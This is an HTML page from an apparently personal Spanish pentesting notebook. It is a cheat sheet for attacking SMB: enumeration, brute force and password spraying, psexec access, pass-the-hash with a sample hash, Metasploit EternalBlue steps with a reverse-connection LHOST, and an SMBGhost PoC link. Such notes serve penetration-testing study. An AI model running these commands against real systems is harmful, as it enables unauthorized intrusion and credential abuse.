@@ -1,0 +1,271 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>139,445 - SMB | Notebook</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes">
+          <h1>Notebook</h1>
+
+          <nav class="vault-tree" aria-label="Ficheros">
+            <a class="vault-file" href="/notebook.html">Inicio</a>
+            <details class="vault-folder" open>
+              <summary>Pivoting</summary>
+              <a class="vault-file" href="/notebook/pivoting/ligolo.html">Ligolo</a>
+              <a class="vault-file" href="/notebook/pivoting/metasploit.html">Metasploit</a>
+              <a class="vault-file" href="/notebook/pivoting/chisel-socat.html">Chisel y Socat</a>
+            </details>
+            <details class="vault-folder" open>
+              <summary>Hacking Wifi</summary>
+              <a class="vault-file" href="/notebook/hacking-wifi/captura-wpa-wpa2.html">Captura WPA/WPA2</a>
+            </details>
+            <details class="vault-folder" open>
+              <summary>Enumeración de Puertos</summary>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/21-ftp.html">21 - FTP</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/22-ssh.html">22 - SSH</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/23-telnet.html">23 - Telnet</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/25-smtp.html">25 - SMTP</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/53-dns.html">53 - DNS</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/79-finger.html">79 - Finger</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/80-443-http-https.html">80,443 - HTTP,HTTPS</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/88-kerberos.html">88 - Kerberos</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/135-rpc.html">135 - RPC</a>
+              <a class="vault-file is-active" href="/notebook/enumeracion-puertos/139-445-smb.html">139,445 - SMB</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/143-imap.html">143 - IMAP</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/161-snmp-udp.html">161 - SNMP (UDP)</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/389-636-3268-3269-ldap.html">389, 636, 3268, 3269 - LDAP</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/1433-mssql.html">1433 - MSSQL</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/1521-oracle-database.html">1521 - Oracle Database</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/2049-nfs.html">2049 - NFS</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/3128-squid-proxy.html">3128 - Squid Proxy</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/3306-mysql.html">3306 - MySQL</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/3389-rdp.html">3389 - RDP</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/5432-5437-postgresql.html">5432,5437 - PostgreSQL</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/5985-5986-winrm.html">5985,5986 - WinRM</a>
+            </details>
+            <details class="vault-folder" open>
+              <summary>Escalada de Privilegios</summary>
+              <details class="vault-folder vault-subfolder" open>
+                <summary>Linux</summary>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/suid.html">SUID</a>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/grupos-vulnerables.html">Grupos Vulnerables</a>
+              </details>
+              <details class="vault-folder vault-subfolder">
+                <summary>Windows</summary>
+              </details>
+            </details>
+          </nav>
+        </aside>
+
+        <article class="note-panel is-active" id="139-445-smb">
+          <div class="note-tabbar">
+            <span>139,445 - SMB</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Enumeración de Puertos</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">enumeración de puertos / smb</p>
+            <h2>139,445 - SMB</h2>
+
+            <h3>Enumeración</h3>
+
+            <section class="code-card">
+              <h3>Enumerar Shares</h3>
+              <pre><code># Probar siempre con  # Null Sesion # Guest user # Credenciales
+crackmapexec smb &lt;ip&gt; -u &#x27;&#x27; -p &#x27;&#x27; --shares                  
+smbclient -L &lt;ip&gt; -N</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Permisos Shares</h3>
+              <pre><code>smbmap -H &lt;ip&gt; 
+smbmap -H &lt;ip&gt; -u &#x27;null&#x27;
+smbmap -H &lt;ip&gt; -r &lt;recurso&gt;/&lt;directorio&gt;
+smbmap -H &lt;ip&gt; -u guest -p &quot;&quot; -d .</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Acceso a Shares</h3>
+              <pre><code>smbclient //&lt;ip&gt;/&lt;recurso&gt; -N 
+smbclient //&lt;ip&gt;/&lt;recurso&gt; -U &lt;usuario&gt;
+smbclient //&lt;ip&gt;/&lt;recurso&gt; -U &lt;usuario&gt;%&lt;contraseña&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Descargar contenido del Share</h3>
+              <pre><code># Null Session
+smbclient -N //&lt;ip_target&gt;/&lt;Share&gt;/ -c &quot;recurse; prompt; mget *;&quot;
+# Credenciales
+smbclient //&lt;ip_target&gt;/&lt;Share&gt;/ -U &lt;user&gt; -c &quot;recurse; prompt; mget *;&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Enumerar Usuarios</h3>
+              <pre><code>crackmapexec smb &lt;ip&gt; -u &#x27;&#x27; -p &#x27;&#x27; --users     
+crackmapexec smb &lt;ip&gt; -u &#x27;&#x27; -p &#x27;&#x27; --rid-brute</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Enum4Linux</h3>
+              <pre><code># Enumeración completa.
+enum4linux -a &lt;ip&gt; 
+# Enumerar con null session o con credenciales
+enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;ip&gt;</code></pre>
+            </section>
+
+            <h3>Fuerza Bruta</h3>
+
+            <section class="code-card">
+              <h3>Fuerza Bruta</h3>
+              <pre><code>crackmapexec smb &lt;ip&gt; -u &lt;users.txt&gt; -p &lt;pass.txt&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Password Spray user:user</h3>
+              <pre><code>crackmapexec smb &lt;ip&gt; -u &lt;users.txt&gt; -p &lt;users.txt&gt; --no-bruteforce --continue-on-success 
+# Poner usuarios en minúscula</code></pre>
+            </section>
+
+            <h3>Acceso SMB</h3>
+
+            <p>Cuando validamos en crackmapexec unas credenciales vemos si aparece <code>Pwned</code>. Significa que el usuario pertenece al grupo <code>Admins Local</code> y puede conectarse con <code>psexec</code> a esa máquina.</p>
+
+            <section class="code-card">
+              <h3>psexec.py &lt;User&gt;@&lt;ip_target&gt; command</h3>
+              <pre><code>impacket-psexec &lt;user&gt;@&lt;ip_target&gt; cmd.exe
+# Aportando contraseña directamente
+impacket-psexec &lt;user&gt;:&lt;password&gt;@&lt;ip_target&gt;</code></pre>
+            </section>
+
+            <h3>Pass The Hash</h3>
+
+            <section class="code-card">
+              <h3>HASH: Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d</h3>
+              <pre><code># Administrator                             Usuario
+# 500                                       Grupo RID
+# aad3b435b51404eeaad3b435b51404ee          LM deshabilitado
+# e3c61a68f1b89ee6c8ba9507378dc88d          HASH NT</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Validar Usuario</h3>
+              <pre><code>crackmapexec smb &lt;ip_target&gt; -u &lt;username&gt; -H &lt;hash_NT&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Acceso SMB con Hash</h3>
+              <pre><code>impacket-psexec Administrator@10.10.10.10 -hashes &lt;Hash_LM:NT&gt; cmd.exe</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Metasploit</h3>
+              <pre><code># Hash_LM:NT aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
+msfconsole -q
+use windows/smb/psexec
+set RHOST &lt;ip_target&gt;
+set SMBUser &lt;user&gt;
+set SMBPass &lt;Hash_LM:NT&gt;
+exploit</code></pre>
+            </section>
+
+            <h3>Versiones Vulnerables</h3>
+
+            <section class="code-card">
+              <h3>EternalBlue (MS17-010): Windows Antiguo y SMBv1</h3>
+              <pre><code>msfconsole -q
+# Comproabar vulnerabilidad
+use exploit/windows/smb/ms17_010
+
+# Explotar vulnerabilidad
+use exploit/windows/smb/ms17_010_eternalblue 
+set RHOSTS &lt;ip_victima&gt; 
+set LHOST &lt;tu_ip&gt; 
+set LPORT 4444 
+exploit</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Version SMB</h3>
+              <pre><code># Metasploit
+msfconsole -q
+use auxiliary/scanner/smb/smb_version
+set RHOSTS &lt;ip_victima&gt;
+run</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Versión V3.5.0 - (V3.0-V4.0)</h3>
+              <pre><code>use exploit/linux/samba/is_known_pipename</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Versión v3.1.1 CVE-2020-0796 (SMBGhost)</h3>
+              <pre><code>-[] Versión SMB 3.1.1
+-[] Windows 10</code></pre>
+            </section>
+
+            <p>Explota un RCE: <a href="https://www.exploit-db.com/exploits/48537">PoC Exploit</a></p>
+
+            <h3>Buscar Recursos Ocultos</h3>
+
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code>#!/bin/bash
+
+ip_target=&quot;192.168.1.10&quot;
+wordlist=&quot;/ruta/shares.txt&quot;
+
+while read -r share; do
+	if smbclient -N &quot;//$ip_target/$share&quot; &amp;&gt;/dev/null; then
+		echo &quot;Recurso con null sesion encontrado: $share&quot;
+	fi
+done &lt; &quot;$wordlist&quot;</code></pre>
+            </section>
+
+            <aside class="callout">
+              <p>Probar también los nombres de usuarios encontrados como posibles recursos compartidos.</p>
+            </aside>
+
+            <h3>Error smbclient</h3>
+
+            <section class="code-card">
+              <h3>Error: protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED</h3>
+              <pre><code>smbclient -L &lt;ip&gt; -N --option &#x27;client min protocol = NT1&#x27;</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ports</span>
+              <span>smb</span>
+              <span>eternalblue</span>
+              <span>hash_ntlm</span>
+              <span>hash_lm</span>
+              <span>pass_the_hash</span>
+              <span>p139</span>
+              <span>p445</span>
+              <span>psexec</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
